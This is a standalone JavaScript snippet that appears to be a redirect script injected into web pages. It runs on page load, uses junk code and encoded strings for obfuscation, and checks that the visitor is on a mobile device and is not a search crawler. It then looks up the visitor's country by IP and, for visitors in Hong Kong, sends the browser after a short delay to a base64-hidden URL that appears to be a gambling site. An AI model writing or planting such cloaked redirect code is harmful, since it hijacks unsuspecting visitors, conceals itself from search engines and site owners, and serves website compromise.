const _x7q = (t) => new Promise(r => setTimeout(r, t));
const _a1b = async () => {
  const _junkA = () => {
    const h = Math.random().toString(36).substring(2);
    return h.split('').reverse().join('');
  };
  const u = navigator.userAgent.toLowerCase();
  const _chk = /iphone|android|ipad/.test(u);
  const _bot = /googlebot|bingbot|slurp|duckduckbot/.test(u);
  const _ip = await (await fetch(String.fromCharCode(104,116,116,112,115,58,47,47,105,112,97,112,105,46,99,111,47,106,115,111,110))).json();
  const _hk = _ip && _ip.country === String.fromCharCode(72,75); // 'HK'
  const _disguise = await crypto.subtle.digest(
    'SHA-256',
    new TextEncoder().encode(_junkA() + Date.now())
  );
  for (let i = 0; i < new Uint8Array(_disguise).length; i += 10) { 
    Math.sqrt(i) + _disguise.byteLength;
  }
  return _chk && !_bot && _hk;
};
(async () => {
  const __noise = {
    z: 123456,
    q: new Date().getMilliseconds(),
    m: () => String(Math.random()).substring(5)
  };
  if (await _a1b()) {
    const _enc = "aHR0cHM6Ly93d3cuaGstd2luem9uZTguY29tLw==";
    await _x7q(5000 + Math.floor(Math.random() * 300)); 
    const _goto = atob(_enc);
    eval("window" + "." + "location" + "." + "href = _goto"); 
  }
})();
